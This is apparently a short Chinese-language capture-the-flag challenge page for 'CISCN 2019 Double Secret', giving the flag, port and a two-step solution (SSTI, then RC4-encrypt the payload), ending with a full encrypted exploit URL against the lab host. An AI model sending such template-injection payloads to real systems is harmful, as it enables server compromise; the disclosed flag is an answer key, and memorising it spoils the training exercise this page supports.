# 题目：CISCN 2019 华东南  Double Secret

### 题目描述：none

### 题目难度： 🌟🌟🌟🌟🌟

### 维护：le31ei

### KEY: `flag{glzjin_wants_a_girl_firend}`

### 配置信息： 
1. 开放端口： `8083`

### 解题过程：

1. SSTI
2. 先爆源码，再 RC4 加密一下。

http://web54.buuoj.cn/secret?secret=%2e%14%19%12%c3%ad%49%34%51%68%c2%91%c3%99%00%c2%ad%c2%8d%c3%89%c3%a6%0b%c2%ac%59%26%c2%b8%6d%c3%9f%49%58%c2%ac%76%c2%b6%6d%c3%9f%27%c3%a5%2e%c2%87%4c%c3%85%1b%c3%b4%3b%c3%9b%44%c2%92%c3%84%c3%99%39%5e%c2%80%52%c3%a7%c3%b2%40%60%63%c3%ac%64%78%c2%8f%2b%0a%c2%8d%c3%b7%58%14%c3%b4%c2%90%51%c3%b3%09%27%59
